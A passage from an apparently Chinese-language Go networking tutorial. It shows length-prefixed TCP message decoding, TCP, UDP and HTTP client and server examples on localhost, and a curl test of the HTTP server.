判断消息头是否正确 40\tif string(MagicBuf) != MsgHeader { 41\treturn nil, errors.New(\u0026#34;msg header error\u0026#34;) 42\t} 43\tlengthBuf := make([]byte, 4) 44\t// 3. 读取消息长度 45\tif _, err = io.ReadFull(bytesBuffer, lengthBuf); err != nil { 46\treturn nil, err 47\t} 48\t// 4. 转换消息长度 49\tlength := binary.BigEndian.Uint32(lengthBuf) 50\tbodyBuf = make([]byte, length) 51\t// 5. 读取实际消息内容 52\tif _, err = io.ReadFull(bytesBuffer, bodyBuf); err != nil { 53\treturn nil, err 54\t} 55\treturn bodyBuf, nil 56} 客户端部分\n1package main 2 3import ( 4\t\u0026#34;fmt\u0026#34; 5\t\u0026#34;gatewat_demo/base/unpack/unpack\u0026#34; 6\t\u0026#34;net\u0026#34; 7) 8 9// main 是程序的入口函数。 10// 它建立一个 TCP 连接到本地的 9090 端口，并发送编码后的消息 \u0026#34;hello world 0!!!\u0026#34;。 11func main() { 12\t// 尝试建立一个 TCP 连接到本地的 9090 端口 13\tconn, err := net.Dial(\u0026#34;tcp\u0026#34;, \u0026#34;localhost:9999\u0026#34;) 14\tdefer conn.Close() // 在函数结束时关闭连接 15\tif err != nil { 16\t// 如果连接失败，打印错误信息并返回 17\tfmt.Println(\u0026#34;Error dialing\u0026#34;, err.Error()) 18\treturn 19\t} 20\t// 使用自定义的 Encode 函数将消息 \u0026#34;hello world 0!!!\u0026#34; 编码并发送 21\tunpack.Encode(conn, \u0026#34;hello world 0!!!\u0026#34;) 22} 服务器部分\n1package main 2 3import ( 4\t\u0026#34;fmt\u0026#34; 5\t\u0026#34;gatewat_demo/base/unpack/unpack\u0026#34; 6\t\u0026#34;net\u0026#34; 7) 8 9// main 是程序的入口函数。 10// 它在本地的 9999 端口上启动一个 TCP 服务器，等待客户端连接并处理连接。 11func main() { 12\t// 1. 本地端口监听 ip:port 13\tlistener, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;localhost:9999\u0026#34;) 14\tif err != nil { 15\t// 如果监听失败，打印错误信息并返回 16\tfmt.Printf(\u0026#34;listen failed, err:%v\\n\u0026#34;, err) 17\treturn 18\t} 19\tfor { 20\t// 2. 等待客户端建立连接 21\tconn, err := listener.Accept() 22\tif err != nil { 23\t// 如果接受连接失败，打印错误信息并继续等待下一个连接 24\tfmt.Printf(\u0026#34;accept failed, err:%v\\n\u0026#34;, err) 25\tcontinue 26\t} 27\t// 3. 启动一个单独的 goroutine 处理连接 28\tgo process(conn) 29\t} 30} 31 32// process 处理单个客户端连接。 33// 它从连接中读取数据并解码，直到发生错误或连接关闭。 34func process(conn net.Conn) { 35\tdefer conn.Close() // 在函数结束时关闭连接 36\tfor { 37\t// 从连接中解码数据 38\tbt, err := unpack.Decode(conn) 39\tif err != nil { 40\t// 如果读取数据失败，打印错误信息并退出循环 41\tfmt.Printf(\u0026#34;read from client failed, err:%v\\n\u0026#34;, err) 42\tbreak 43\t} 44\t// 打印从客户端接收到的数据 45\tfmt.Printf(\u0026#34;receive from client, data:%v\\n\u0026#34;, string(bt)) 46\t} 47} 运行后可以看到 golang创建udp服务器和客户端 客户端\n1package main 2 3import ( 4\t\u0026#34;fmt\u0026#34; 5\t\u0026#34;net\u0026#34; 6) 7 8func main() { 9\t// 1. 本地端口监听 ip:port 10\tconn, err := net.DialUDP(\u0026#34;udp\u0026#34;, nil, \u0026amp;net.UDPAddr{ 11\tIP: net.IPv4(127, 0, 0, 1), 12\tPort: 9999, 13\t}) 14\tif err != nil { 15\tfmt.Printf(\u0026#34;connect failed, err:%v\\n\u0026#34;, err) 16\treturn 17\t} 18 19\t//2. 发送数据 20\tfor i := 0; i \u0026lt; 100; i++ { 21\t_, err = conn.Write([]byte(\u0026#34;hello server\u0026#34;)) 22\tif err != nil { 23\tfmt.Printf(\u0026#34;send data failed, err:%v\\n\u0026#34;, err) 24\treturn 25\t} 26\t// 3. 接收数据 27\tresult := make([]byte, 1024) 28\tn, remoteAddr, err := conn.ReadFromUDP(result) 29\tif err != nil { 30\tfmt.Printf(\u0026#34;receive data failed, err:%v\\n\u0026#34;, err) 31\treturn 32\t} 33\tfmt.Printf(\u0026#34;receive from addr:%v data:%v count:%v\\n\u0026#34;, remoteAddr, string(result[:n]), n) 34\t} 35 36} 服务端\n1package main 2 3import ( 4\t\u0026#34;fmt\u0026#34; 5\t\u0026#34;net\u0026#34; 6) 7 8// main 是程序的入口函数。 9// 它在本地的 9999 端口上启动一个 UDP 服务器，等待客户端发送消息并回复。 10func main() { 11\t// 1. 本地端口监听 ip:port 12\tlistener, err := net.ListenUDP(\u0026#34;udp\u0026#34;, \u0026amp;net.UDPAddr{ 13\tIP: net.IPv4(127, 0, 0, 1), 14\tPort: 9999, 15\t}) 16\tif err != nil { 17\t// 如果监听失败，打印错误信息并返回 18\tfmt.Printf(\u0026#34;listen failed, err:%v\\n\u0026#34;, err) 19\treturn 20\t} 21\t// 2. 循环读取消息 22\tfor { 23\tvar data [1024]byte 24\t// 使用 ReadFromUDP 读取数据，返回数据长度 n，客户端地址 addr，错误 err 25\tn, addr, err := listener.ReadFromUDP(data[:]) 26\tif err != nil { 27\t// 如果读取数据失败，打印错误信息并退出循环 28\tfmt.Printf(\u0026#34;read from udp failed, err:%v\\n\u0026#34;, err) 29\tbreak 30\t} 31 32\t// 启动一个单独的 goroutine 处理客户端请求 33\tgo func() { 34\t// 3. 回复数据 35\tfmt.Printf(\u0026#34;data:%v addr:%v count:%v\\n\u0026#34;, string(data[:n]), addr, n) 36\t_, err = listener.WriteToUDP([]byte(\u0026#34;received success\u0026#34;), addr) 37\tif err != nil { 38\t// 如果发送数据失败，打印错误信息 39\tfmt.Printf(\u0026#34;write to udp failed, err:%v\\n\u0026#34;, err) 40\treturn 41\t} 42\t}() 43\t} 44} tcp实现 如果没有deferclose会出现什么情况\n如果server端没有close，客户端会停在FIN_WAIT_2，服务器会停在CLOSE_WAIT golang创建http服务器和客户端 1package main 2 3import ( 4\t\u0026#34;log\u0026#34; 5\t\u0026#34;net/http\u0026#34; 6\t\u0026#34;time\u0026#34; 7) 8 9const Addr = \u0026#34;localhost:9999\u0026#34; 10 11// main 是程序的入口函数。 12// 它创建一个 HTTP 服务器并在本地的 9999 端口上启动服务。 13func main() { 14 15\t// 1. 创建一个 http.ServeMux 路由器 16\tmux := http.NewServeMux() 17\t// 2. 设置路由规则 18\tmux.HandleFunc(\u0026#34;/bye\u0026#34;, sayBye) 19\t// 3. 创建一个 http.Server 20\tserver := http.Server{ 21\tAddr: Addr, 22\tHandler: mux, 23\tWriteTimeout: time.Second * 3, 24\t} 25\t// 4. 监听端口并启动服务 26\tlog.Println(\u0026#34;Starting http server at \u0026#34; + Addr) 27\tlog.Fatal(server.ListenAndServe()) 28} 29 30// sayBye 处理 /bye 路由的请求。 31// 它等待 1 秒钟，然后返回 \u0026#34;bye bye, this is http server\u0026#34; 响应。 32func sayBye(w http.ResponseWriter, r *http.Request) { 33\ttime.Sleep(1 * time.Second) 34\tw.Write([]byte(\u0026#34;bye bye, this is http server\u0026#34;)) 35} 测试得到\n1agq@AGdeMacBook-Air tcp_client % curl -v \u0026#39;http//127.0.0.1:9 2999/bye\u0026#39; 3* Could not resolve host: http 4* Closing connection 0 5curl: (6) Could not resolve host: http 6agq@AGdeMacBook-Air tcp_client % curl -v \u0026#39;http://127.0.0.1:9999/bye\u0026#39; 7* Trying 127.0.0.1:9999... 8* Connected to 127.0.0.1 (127.0.0.1) port 9999 (#0) 9\u0026gt; GET /bye HTTP/1.1 10\u0026gt; Host: 127.0.0.1:9999 11\u0026gt; User-Agent: curl/8.1.2 12\u0026gt; Accept: */* 13\u0026gt; 14\u0026lt; HTTP/1.1 200 OK 15\u0026lt; Date: Thu, 19 Sep 2024 13:22:37 GMT 16\u0026lt; Content-Length: 28 17\u0026lt; Content-Type: text/plain; charset=utf-8 18\u0026lt; 19* Connection #0 to host 127.0.0.1 left intact 20bye bye, this is http server% ","date":"0001-01-01T00:00:00Z","permalink":"https://anonymity-0.github.io/posts/gateway%E6%96%87%E6%A1%A3/","title":"gateway文档"}]